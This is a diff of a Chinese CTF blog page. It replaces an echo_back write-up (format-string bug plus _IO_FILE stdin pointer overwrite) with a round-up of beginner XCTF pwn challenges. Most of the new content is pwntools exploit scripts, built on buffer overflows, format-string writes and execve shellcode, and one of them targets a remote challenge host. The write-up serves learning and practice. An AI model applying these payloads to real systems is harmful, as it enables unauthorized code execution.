@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CISCN-2018-Quals  echo_back | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" 格式化字串 , IO_File ">
-  <meta name="description" content="CISCN-2018-Quals  echo_back | sixpar&#39;s blog">
+  <title>攻防世界初阶回顾 | sixpar&#39;s blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="攻防世界初阶回顾 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -596,9 +596,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CISCN-2018-Quals-echo-back" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-攻防世界初阶回顾" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CISCN-2018-Quals  echo_back</h1>
+        <h1 class="article-title">攻防世界初阶回顾</h1>
     
     <div class="article-meta">
         
@@ -613,24 +613,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color1">格式化字串</a>
-            
-            <a class="color3">IO_File</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-07-16 16:50:27'>2020-07-16 16:24</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-11 23:48:09'>2020-07-11 23:22</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:3.6k</span>
+        <span>Count:2.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -660,7 +651,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-File："><span class="toc-text">IO_File：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-new-file-underflow-函数："><span class="toc-text">_IO_new_file_underflow 函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析："><span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setName功能："><span class="toc-text">setName功能：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo-back功能："><span class="toc-text">echo_back功能：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程："><span class="toc-text">解题过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-File结构体："><span class="toc-text">IO_File结构体：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结："><span class="toc-text">小结：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CGfsb："><span class="toc-text">2.CGfsb：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-when-did-you-born："><span class="toc-text">3.when_did_you_born：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-hello-pwn"><span class="toc-text">4.hello_pwn:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-level0"><span class="toc-text">5.level0:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-level2"><span class="toc-text">6.level2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-string："><span class="toc-text">7.string：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-guess-number："><span class="toc-text">8.guess_number：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-int-overflow："><span class="toc-text">9.int_overflow：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-cgpwn2"><span class="toc-text">10.cgpwn2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-level3"><span class="toc-text">11.level3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -676,356 +667,168 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>正常情况下我们用户的输入长度和写入位置都会受到程序限制的,不可能让用户任意地址任意长度写入;<br>但是利用特定的漏洞,我们可以修改到 IO结构体 中的指针,就可以绕过约束</p>
-</blockquote>
-<h2 id="IO-File："><a href="#IO-File：" class="headerlink" title="IO_File："></a>IO_File：</h2><h3 id="IO-new-file-underflow-函数："><a href="#IO-new-file-underflow-函数：" class="headerlink" title="_IO_new_file_underflow 函数："></a>_IO_new_file_underflow 函数：</h3><p>调用scanf函数最终是从stdin中读取数据的，而stdin是一个FILE (_IO_FILE) 结构体指针。<br>_IO_new_file_underflow函数揭示了scanf输入的内部结构，它最终会调用_IO_SYSREAD系统调用来读取文件。这是本题的关键知识点。<br>贴上源码：</p>
-<pre><code class="c">int
-_IO_new_file_underflow (_IO_FILE *fp)
-{
-  _IO_ssize_t count;
-#if 0
-  /* SysV does not make this test; take it out for compatibility */
-  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
-    return (EOF);
-#endif
-
-  if (fp-&gt;_flags &amp; _IO_NO_READS)
-    {
-      fp-&gt;_flags |= _IO_ERR_SEEN;
-      __set_errno (EBADF);
-      return EOF;
-    }
-  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
-    return *(unsigned char *) fp-&gt;_IO_read_ptr;
-
-  if (fp-&gt;_IO_buf_base == NULL)
-    {
-      /* Maybe we already have a push back pointer.  */
-      if (fp-&gt;_IO_save_base != NULL)
-    {
-      free (fp-&gt;_IO_save_base);
-      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
-    }
-      _IO_doallocbuf (fp);
-    }
-  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))
-    {
-#if 0
-      _IO_flush_all_linebuffered ();
-#else
-      _IO_acquire_lock (_IO_stdout);
-
-      if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
-      == (_IO_LINKED | _IO_LINE_BUF))
-    _IO_OVERFLOW (_IO_stdout, EOF);
-
-      _IO_release_lock (_IO_stdout);
-#endif
-    }
-
-  _IO_switch_to_get_mode (fp);
-  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
-  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
-  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
-    = fp-&gt;_IO_buf_base;
-
-  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
-               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
-  if (count &lt;= 0)
-    {
-      if (count == 0)
-    fp-&gt;_flags |= _IO_EOF_SEEN;
-      else
-    fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;
-  }
-  fp-&gt;_IO_read_end += count;
-  if (count == 0)
-    {
-      fp-&gt;_offset = _IO_pos_BAD;
-      return EOF;
-    }
-  if (fp-&gt;_offset != _IO_pos_BAD)
-    _IO_pos_adjust (fp-&gt;_offset, count);
-  return *(unsigned char *) fp-&gt;_IO_read_ptr;
-}
-libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</code></pre>
-<p> _IO_new_file_underflow 函数中第17行存在一个检测，if(fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)，则表明输入缓冲区里存在数据，则直接返回一个read_ptr指针。<br>如果这个if不成立(即fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end时)则无需返回，继续执行下面。</p>
-<p>对源码做一下总结：<br>当fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end时,就可以通过系统调用向fp-&gt;_IO_buf_base处写入数据啦，并且写入的长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
-<p>所以只要我们可以控制以下这4个指针,那么基本就可以任意地址任意写了;</p>
-<blockquote>
-<p>_IO_read_ptr<br>_IO_read_end<br>_IO_buf_base<br>_IO_buf_end</p>
-</blockquote>
-<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p>保护机制全开：</p>
-<blockquote>
-<p>Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled</p>
-</blockquote>
-<p>程序菜单只显示三个功能：setName 、 echo_back 、 exit</p>
-<h3 id="setName功能："><a href="#setName功能：" class="headerlink" title="setName功能："></a>setName功能：</h3><p>首先检测v5是否不为1，不为1则执行以下：</p>
-<blockquote>
-<p>printf(“name:”);<br>return read(0, a1, 7uLL);</p>
-</blockquote>
-<p>只能输入7个字节。<br>并且name输入完后，把v5变量置为1，说明name只能输入一次。</p>
-<h3 id="echo-back功能："><a href="#echo-back功能：" class="headerlink" title="echo_back功能："></a>echo_back功能：</h3><blockquote>
-<p> printf((const char *)&amp;nbytes + 4);</p>
-</blockquote>
-<p>说明此处存在格式化字符串漏洞</p>
-<blockquote>
-<p>if ( (nbytes &amp; 0x80000000) != 0LL || (signed int)nbytes &gt; 6 )<br>   LODWORD(nbytes) = 7;</p>
-</blockquote>
-<p>说明最多只能输入7个字符咯。</p>
-<p>以及：</p>
-<blockquote>
-<p>printf(“length:”, 0LL);<br>_isoc99_scanf((<strong>int64)”%d”, (</strong>int64)&amp;nbytes);<br>getchar();</p>
-</blockquote>
-<p>并且注意到length的大小是通过 _isoc99_scanf 输入的。且后续还调用了getchar函数，这些函数的用法后续会讲到。<br>这也是我今天刚学会的知识点。</p>
-<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><p>1.PIE开启 ==&gt; 尝试泄露elf基址<br>2.泄露libc基址</p>
-<p>首先由于echo_back存在格式化字符串漏洞，所以我们在运行程序时尝试去泄露一些数据。<br>我们gdb调试一下程序看栈上有无可以利用的地址。<br>首先切换至pwngdb调试工具，找到pie后的大致地址，发现elf的地址类似为 0x555555554xxx  ，最后三位就是各自的偏移了。<br>由IDA查看得libc_start_main函数的末尾：</p>
-<blockquote>
-<p>.text:0000000000000C6A                 leave<br>.text:0000000000000C6B                 retn</p>
-</blockquote>
-<p>所以得到leave的实际地址为0x555555554C6A<br>切换回gdb-peda，在leave这个地方下断点：<br>b *0x555555554C6A ，然后输入r运行程序。name输入“aaaaaa”，length输入“7”，数据随便，然后好像是自动截断了程序。<br>查看栈上内容。输入 stack 20  查看栈上20项数据</p>
-<pre><code class="python">gdb-peda$ stack 20
-0000| 0x7fffffffdd10 --&gt; 0x555555554ef8 --&gt; 0x74697865202e33 (&#39;3. exit&#39;)
-0008| 0x7fffffffdd18 --&gt; 0x7fffffffdd60 --&gt; 0xa616161616161 (&#39;aaaaaa\n&#39;)
-0016| 0x7fffffffdd20 --&gt; 0xa32 (&#39;2\n&#39;)
-0024| 0x7fffffffdd28 --&gt; 0x70d170c00 
-0032| 0x7fffffffdd30 --&gt; 0xa7024323125 (&#39;%12$p\n&#39;)
-0040| 0x7fffffffdd38 --&gt; 0x403e35500d170c00 
-0048| 0x7fffffffdd40 --&gt; 0x7fffffffdd70 --&gt; 0x555555554d30 (push   r15)
-0056| 0x7fffffffdd48 --&gt; 0x555555554d08 (jmp    0x555555554d0b)
-0064| 0x7fffffffdd50 --&gt; 0x555555554d30 (push   r15)
-0072| 0x7fffffffdd58 --&gt; 0x200000001 
-0080| 0x7fffffffdd60 --&gt; 0xa616161616161 (&#39;aaaaaa\n&#39;)
-0088| 0x7fffffffdd68 --&gt; 0x403e35500d170c00 
-0096| 0x7fffffffdd70 --&gt; 0x555555554d30 (push   r15)
-0104| 0x7fffffffdd78 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
-0112| 0x7fffffffdd80 --&gt; 0x1 
-0120| 0x7fffffffdd88 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1d0 (&quot;/home/sixpar/desktop/ADWord-pwn/high/10.CISCN-2018-Quals  echo_back/echo_back&quot;)
-0128| 0x7fffffffdd90 --&gt; 0x1f7ffcca0 
-0136| 0x7fffffffdd98 --&gt; 0x555555554c6c (push   rbp)
-0144| 0x7fffffffdda0 --&gt; 0x0 
-0152| 0x7fffffffdda8 --&gt; 0x43e938916e459b29 </code></pre>
-<p>发现了第15行：</p>
-<blockquote>
-<p>0096| 0x7fffffffdd78 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)</p>
-</blockquote>
-<p>可以看到0x7ffff7a2d830这个地址对应着 <strong>libc_start_main+240<br>这么说我们只要把这个地址泄露出来，然后减去固定偏移 240，那么我们就可以得到 __libc_start_main地址了。<br>那么这个地址怎么泄露呢？我们利用格式化字符串漏洞。<br>另开一个终端，运行程序，name随便输，在length处输入“7”，然后接着输入类似“%num$p”形式的数据来泄露地址。<br>我们发现当输入“%12$p”时才能泄露出一个地址，在12以前的都没用。<br>于是我们就从偏移12开始，偏移不断加一，试过去，最终在“%19$n”的时候泄露出0x7ffff7a2d830，即我们想要得到的地址（</strong>libc_start_main+240）</p>
-<p>这么一来，libc的基址问题解决了，我们可以算出其他函数的地址：</p>
-<pre><code class="python">libc_base = libc_s_m_addr - libc.symbols[&#39;__libc_start_main&#39;]
-system = libc_base + libc.symbols[&#39;system&#39;]
-bin_sh = libc_base + libc.search(&#39;/bin/sh&#39;).next()
-IO_stdin_addr = libc_base + libc.symbols[&#39;_IO_2_1_stdin_&#39;]   # IO_2_1_stdin基址</code></pre>
-<p>另外我们发现栈上第12行，即偏移为16（%16$p）的地方存储着我们输入的name内容。这个后面有用。</p>
-<p>关于如何泄露ELF地址，很容易，应该只要是泄露0x555555554xxx形式的都可以。<br>所以我们选择了 %13$p 处的地址<br>输入“%13$p”，之后再用这个地址减去 0xd08 即可得到elf基址。</p>
-<p>接下去我们想用格式化字符串漏洞修改main函数的返回地址,也就是修改%19$p处的数据。<br>但是我们要意识到，%19$n并不能达成我们的目标，因为%19$n是把%19$p的数据当成一个地址，然后往那个地址里写数据,也就是说，它会把 0x7ffff7a2d830  当成一个地址，然后往这个地址里写数据，而我们却希望是它往 0x7fffffffdd78  这个地址处写数据。<br>那么，我们首先得暴露出它的值（指的是0x7fffffffdd78），但是，栈里面也没有这个数据出现啊。然而，却有main函数的rbp数据。发现了宝藏。</p>
-<p>发现栈上数据的第8行处：</p>
-<blockquote>
-<p>0048| 0x7fffffffdd40 –&gt; 0x7fffffffdd70 –&gt; 0x555555554d30 (push   r15)</p>
-</blockquote>
-<p>看到没有，存储着0x7fffffffdd70，那么我们泄露出这个地址后就可以 +8 得到 main函数的返回地址啦。这么说这个地址处的内容是 main的rbp咯。<br>这个地方偏移为12，所以“%12$p”就可以泄露啦。</p>
-<p>好了，第一阶段泄露地址工作已经做完，接下去进入第二阶段。</p>
-<p>接下来我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)就占了8个字符，而我们最多只被允许输入7个字符。<br>因此我们想到了setName功能，它不是白放那里的，它有着重要的作用。</p>
-<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但由于是低位存储，也就是数据的前导0被舍弃，然而并不影响，除非那个数据8字节没有前导0。<br>我们之前就发现了的，%16$p输出的就是name的数据。<br>于是，我们就可以先setName(p64(addr))设立好靶子，然后利用%16$n来对addr处写数据（因为我们的输入是在偏移16）。<br>所以会把00写入到</p>
-<p>然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7</p>
-<p>于是，我们就需要用到一个新知识了，为了绕过7个字符的限制，我们换一个思路，我们利用格式化字符串漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处随意输入数据。<br>怎么随意输入数据呢？那就是修改IO_File结构体，令_IO_read_ptr == _IO_read_end，然后就可以向_IO_buf_base处写入读取的数据，并且输入的长度为 _IO_buf_end - _IO_buf_base</p>
-<h3 id="IO-File结构体："><a href="#IO-File结构体：" class="headerlink" title="IO_File结构体："></a>IO_File结构体：</h3><p>结构体大致结构如下：（本题调试所得）</p>
-<pre><code class="python">gdb-peda$ p _IO_2_1_stdin_
-$2 = {
-  file = {
-    _flags = 0xfbad208b, 
-    _IO_read_ptr = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-    _IO_read_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-    _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-    _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-    _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-    _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-    _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
-    _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
-    _IO_save_base = 0x0, 
-    _IO_backup_base = 0x0, 
-    _IO_save_end = 0x0, 
-    _markers = 0x0, 
-    _chain = 0x0, 
-    _fileno = 0x0, 
-    _flags2 = 0x0, 
-    _old_offset = 0xffffffffffffffff, 
-    _cur_column = 0x0, 
-    _vtable_offset = 0x0, 
-    _shortbuf = &quot;\n&quot;, 
-    _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;, 
-    _offset = 0xffffffffffffffff, 
-    _codecvt = 0x0, 
-    _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;, 
-    _freeres_list = 0x0, 
-    _freeres_buf = 0x0, 
-    __pad5 = 0x0, 
-    _mode = 0xffffffff, 
-    _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
-  }, 
-  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
-}</code></pre>
-<p>关于 _IO_2_1_stdin_的地址，之前算出libc基址后就不难算出：0x7ffff7dd18e0<br>所以_IO_buf_base的地址就是 0x7ffff7dd18e0 + 0x8*7 = 0x7ffff7dd1918<br>前面有7个8字节的地址嘛，不难理解吧。</p>
-<p>于是我们之前讲到的将 _IO_buf_base地址的低位覆盖为\x00，即变为0x7ffff7dd1900<br>这个地址又是哪里？</p>
-<pre><code class="python">gdb-peda$ x/20xg 0x7ffff7dd1900
-0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963
-0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963</code></pre>
-<p>可以看到0x7ffff7dd1900处是<em>IO_2_1_stdin</em>+32，即对应着_IO_write_base的地址。<br>如果理解不了，那就看：</p>
-<pre><code class="python">gdb-peda$ x/20xg 0x7ffff7dd18e0
-0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007ffff7dd1964
-0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007ffff7dd1964    0x00007ffff7dd1963
-0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963</code></pre>
-<p>你8个字节8个字节比对下来嘛，<em>IO_2_1_stdin</em>+32 （0x8*4）对应着_IO_write_base的地址，也就是结构体的第5个数据。</p>
-<p>可见我们成功地打入到结构体内部去了。<br>现在，我们可以从0x7ffff7dd1900 （_IO_write_base）处向后输入，最好能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，那么我们就能绕过7个字符的输入限制。最终能输入字符的大小取决于_IO_buf_end-_IO_buf_base了。</p>
-<p>之后还有一个检测需要绕过，<br>更详细的解释我都写在exp里了。现在是晚上23:44，我困了，为了明天有精神早起，我准备收工了，太累了。</p>
-<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><pre><code class="python">#! /usr/bin/env python
-#coding:utf8
+        <h2 id="2-CGfsb："><a href="#2-CGfsb：" class="headerlink" title="2.CGfsb："></a>2.CGfsb：</h2><p>格式化字符串任意地址修改：</p>
+<pre><code class="python">from pwn import *
+#context.log_level = &#39;debug&#39;
+conn = remote(&quot;111.198.29.45&quot;,54083)
+pwnme = 0x0804A068
+payload = (p32(pwnme) + &#39;a&#39;*4 + &#39;%10$n&#39;)    #pwnme地址占4个字节，所以后面还需要打印4个a ，才能将pwnme地址处的内容修改为8
+conn.recvuntil(&#39;please tell me your name:&#39;)
+conn.sendline(&#39;aaaa&#39;)
+conn.recvuntil(&#39;leave your message please:&#39;) 
+conn.sendline(payload)
+print(conn.recvall())</code></pre>
+<h2 id="3-when-did-you-born："><a href="#3-when-did-you-born：" class="headerlink" title="3.when_did_you_born："></a>3.when_did_you_born：</h2><p>修改邻接变量：</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./born&#39;)
+p.recvuntil(&#39;Your Birth?&#39;)
+p.sendline(&#39;2000&#39;)
+payload=&#39;a&#39;*8+p64(0x786)  #0x786 = 1926
+p.recvuntil(&#39;Your Name?&#39;)
+p.sendline(payload)
+p.interactive()</code></pre>
+<h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4.hello_pwn:"></a>4.hello_pwn:</h2><p>修改邻接变量：</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./hello_pwn&#39;)
+hex_1853186401=0x6e756161
+payload=&#39;a&#39;*4+p64(hex_1853186401)
+p.recvuntil(&#39;lets get helloworld for bof&#39;)
+p.sendline(payload)
+p.interactive()</code></pre>
+<h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5.level0:"></a>5.level0:</h2><p>覆盖返回地址为system函数：</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./lv0&#39;)
+call_system=0x400596
+payload=&#39;a&#39;*(0x80+8)+p64(call_system) 
+p.recvuntil(&#39;Hello, World&#39;)
+p.sendline(payload)
+p.interactive()</code></pre>
+<h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6.level2:"></a>6.level2:</h2><p>程序有现成的。覆盖返回地址，调用system函数然后参数是binsh字符串</p>
+<pre><code class="python">from pwn import *
+p=process(&#39;./lv2&#39;)
+system_addr=0x8048320
+binsh_addr=0x804a02a
+payload=&#39;a&#39;*(0x88+4)+p32(system_addr)+&#39;b&#39;*4+p32(binsh_addr)
+#p.recvuntil(&#39;Input:&#39;)
+p.sendline(payload)
+p.interactive()</code></pre>
+<h2 id="7-string："><a href="#7-string：" class="headerlink" title="7.string："></a>7.string：</h2><h3 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h3><p>程序开始，main主函数里有：<br>v4=malloc(8uLL) ，动态分配内存，地址赋给v4。<br>v5=(_int64)v4   ，即v4赋值给v5，相当于v4和v5都指向同一地址。<br>*v4=68  ，就相当于v4[0]=68<br>然后令 v4[1]=85</p>
+<p>程序一开始就告诉我两个secret，secret[0]是v4的地址，secret[1]是v4+1的地址（即v4[1]的地址）。<br>然后进入sub_400D72：要求输入勇士的名字，随便输入，然后建立一个勇士，没啥毛病。</p>
+<p>然后是三个函数，从上到下依次进入咯。</p>
+<p>先进入第一个函数sub_400A7D：<br>要求选择east还是up？若选择了east，则strcmp（&amp;s1,”east”）的结果为0，就不执行if语句，直接退出这个函数。这里直接退出就行了，所以选择east。</p>
+<p>然后进入第二个函数sub_400BB9：要求是there（1）还是leave（0）？不过我们发现这个函数里面有格式化字符串漏洞，那么就必须要利用一下。如果选择0，那么就退出这个函数了！所以我们选择1，继续待在这个函数，利用格式化字符串漏洞。<br>接着程序提示，让我们输入一个地址，我们输入v4[0]的地址进去，程序会把我们所输入的地址存入到v2里，所以我们就要想办法知道这个v2在栈中的什么位置，这一点可以通过格式化漏洞解决，经测试，是在第七个参数。<br>然后下一步提示你的wish，我们要利用这里来修改v4[0]的数据，所以输入%85c%7$n，即将85写入栈内第7个参数所指向的地址，将v4[0]的值改为85（格式化字符串漏洞任意写），程序正常走完，退出。</p>
+<p>最后进入第三个函数sub_100CA6：<br>我这里的if语句是if ( <em>(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )<br>而别人wp的语句是if（</em>a1==a1[1]），怎么回事？后续补充：后来学到了一个知识，鼠标右键选择hide casts，即可省略一些东西，方便阅读。hide casts之后，这语句变为了( <em>a1 == *(a1 + 4) )，但仔细想想还是可以理解的，每个数据限定4个字节，a1是a1[0]，所以a1+4不就是a1[1]嘛<br>而</em>a1就是a1[0]<br>所以要使得程序中 a1[0]=a1[1]<br>而要注意的是，sub_100CA6函数被sub_400D72函数调用时，所传入的实参是a1，即sub_100CA6(a1)<br>而sub_400D72函数被main主函数调用时所传入的实参是v5，即sub_400D72(v5)<br>而v5=v4！所以这么一回溯的话，得出 *a1=a1[0]=v4[0]=68<br>但是现在a1[1]=v4[1]=85 ≠ v4[0]的68<br>所以就要利用第二个流程里的格式化字符串漏洞任意写的功能来实现修改了，我们之前也介绍过了，可以将v4[0]的值改为85，使其与v4[1]即a1[1]相等。然后令if语句判断成立。<br>继续看下面程序，<br> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);<br>该语句是将v1转化为可执行函数（我是看不懂啥意思的，，，还是死记硬背吧）<br>hide casts之后是(v1)(0LL, v1);<br>本题没有system函数，所以要在此处写个shellcode来执行、<br>刚好有个read函数读取我们的shellcode，完美。</p>
+<p>总结一下：通过格式化字符串漏洞修改v4[0]的值，使之与v4[1]相等（当然你也可以改v4[1]的值）。然后就可以读入shellcode，由于有一条指令是将v1强制转化为函数指针类型的，所以我们的shellcode就可以运行了。</p>
+<pre><code class="python">#coding:utf-8
 from pwn import *
+context.log_level=&#39;debug&#39;
+p=process(&#39;./string&#39;)
+p.recvuntil(&quot;secret[0] is &quot;)
+v4_0_addr = int(p.recvuntil(&quot;\n&quot;)[:-1], 16)   #[:-1]表示最后一个（&#39;\n&#39;）不取。
+log.info(&quot;v4_0_addr:&quot; + hex(v4_0_addr))  #打印v4[0]的地址
+p.recvuntil(&#39;name be:&#39;)
+p.sendline(&#39;sixpar&#39;)
+p.recvuntil(&#39;east or up?:&#39;)
+p.sendline(&#39;east&#39;)
+p.recvuntil(&#39;there(1), or leave(0)?:&#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&quot;&#39;Give me an address&#39;&quot;)
+#这里注意源代码中是 _isoc99_scanf(&quot;%ld&quot;, &amp;v2);
+读入的不是字符串，是int64，是个数字，不要输入0x开头的字符串，也不要输入类似于1003fd2c的十六进制字符串，就输入一个十进制数字就行了。不要使用p64()转换！！！int转换即可，但是由于send要求发送的是一个字符串，所以再str一下即可
+p.sendline(str(v4_0_addr))
+p.recvuntil(&#39;you wish is:&#39;)
+p.sendline(&quot;%85c%7$n&quot;)
+shellcode=&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;
+p.recvuntil(&#39;USE YOU SPELL&#39;)
+p.sendline(shellcode)
+p.interactive()</code></pre>
+<h2 id="8-guess-number："><a href="#8-guess-number：" class="headerlink" title="8.guess_number："></a>8.guess_number：</h2><p>通过gets函数覆盖seed值（v8和seed相距0x20），劫持rand函数</p>
+<p>伪随机数<br>猜10次数字，范围1~6。猜对直接拿到flag.<br>漏洞点在于：<br>相同的环境下，如果不设定(srand)一个种子(seed)的话，每次随机到的随机数序列是相同的。比如种子为0时，在linux下的随机数序列为{2,5,4,2,6,2,5,1,4,2,…}<br>（想要每次运行时得到的随机数序列不同，可以每次运行都设定一个不同的种子，比如时间）<br>所以我们可以通过输入v7时覆盖掉seed[0]，使得种子恒定。然后本地用C语言，针对某一种子，求出其随机数序列中的前十个。<br>（注意！windows和linux求出的随机数序列不同，这是个坑，所以我们要在linux上实现C语言随机生成）</p>
+<p>C脚本如下：</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(){
+    srand(2333);  
+    for (int i=0; i&lt;=9; i++){
+        printf(&quot;%d,&quot;, rand() % 6 + 1);
+    }
+    printf(&quot;\n&quot;);
+}</code></pre>
+<p>播撒的种子是 2333<br>gcc 8.cpp -o 8，进行编译，得到可执行文件8。<br>运行./8即可得到随机数：4,2,5,3,3,3,4,1,1,1,</p>
+<p>所以这些所谓随机数我们也知道了。<br>exp脚本如下：</p>
+<pre><code class="python">from  pwn import *
+p=process(&#39;./num&#39;)
+num=[4,2,5,3,3,3,4,1,1,1]
+p.recvuntil(&#39;Your name:&#39;)
+payload1=&#39;a&#39;*(0x30-0x10)+p64(0x91d)
+p.sendline(payload1)
+for i in range(10):
+    p.sendlineafter(&#39;Please input your guess number:&#39;,str(num[i]))
+p.interactive()</code></pre>
+<h2 id="9-int-overflow："><a href="#9-int-overflow：" class="headerlink" title="9.int_overflow："></a>9.int_overflow：</h2><p>漏洞点：整数溢出</p>
+<p>read函数读入长度为0x199的passwd<br>对passwd进行判断，if(长度&lt;=3 或者 长度&gt;8)则视为无效数据，所以只有长度介于[4,8)的passwd才会被写入dest栈内</p>
+<p>v3=strlen(s)。v3由于是无符号整数，所以范围是0~255，超出会造成整数溢出<br>但又不能溢出，s的长度范围只能介于[4,8)，那咋办呢？<br>整数溢出漏洞了解一下！</p>
